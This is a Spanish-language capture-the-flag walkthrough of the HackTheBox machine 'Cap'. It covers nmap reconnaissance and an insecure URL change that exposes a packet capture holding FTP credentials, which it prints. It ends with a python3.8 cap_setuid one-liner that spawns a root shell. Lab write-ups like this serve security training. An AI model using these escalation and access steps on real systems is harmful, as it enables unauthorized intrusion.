# Cap - HackTheBox

## Reconocimiento

Vamos a realizar un escaneo de puertos con nmap para identificar los servicios que están corriendo en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.156.141 -oG allPorts

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
nmap -sCV -p21,22,80 10.129.156.141

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Dentro de la web encontramos un panel de administración con la sesión de un usuario llamado nathan.

http://10.129.156.141/data/1

Aquí podemos descargar datos de tráfico de red, al cambiar la url a http://10.129.156.141/data/0 descargamos un archivo que al analizarlo contiene el usuario y contraseña del servicio ftp: `nathan:Buck3tH4TF0RM3!`

## Escalada de privilegios

Vemos las capabilities de los binarios del sistema:

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Cemos que el binario `/usr/bin/python3.8` tiene las capabilities `cap_setuid` y `cap_net_bind_service`, lo que nos permite ejecutar python3.8 como usuario normal y cambiar nuestro UID a 0 (root).

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'

root@cap:/root# cat root.txt
```

De esta forma conseguimos escalar privilegios y obtener la flag de root.